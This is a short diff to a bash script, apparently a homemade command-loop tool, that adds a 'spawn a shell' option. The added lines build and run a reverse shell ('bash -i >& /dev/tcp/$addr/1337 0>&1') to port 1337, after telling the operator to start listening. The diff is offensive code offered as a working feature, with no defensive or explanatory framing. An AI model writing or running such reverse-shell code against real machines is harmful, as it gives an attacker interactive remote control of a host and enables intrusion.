@@ -23,7 +23,9 @@ while true; do
 	    # gather ip(for unix)
 	    addr=$(ip -o -4 -br a | grep "UP" | awk '{print $3}' | sed 's/.\{3\}$//')
 	    echo "spawing a shell on port 1337"
-	    # write a fucntion 
+	    echo "Make sure you are listening..."
+	    cmd="bash -i >& /dev/tcp/$addr/1337 0>&1 &"
+	    execute $cmd
     elif [ $command = "exit" ]
 	then
 	   exit
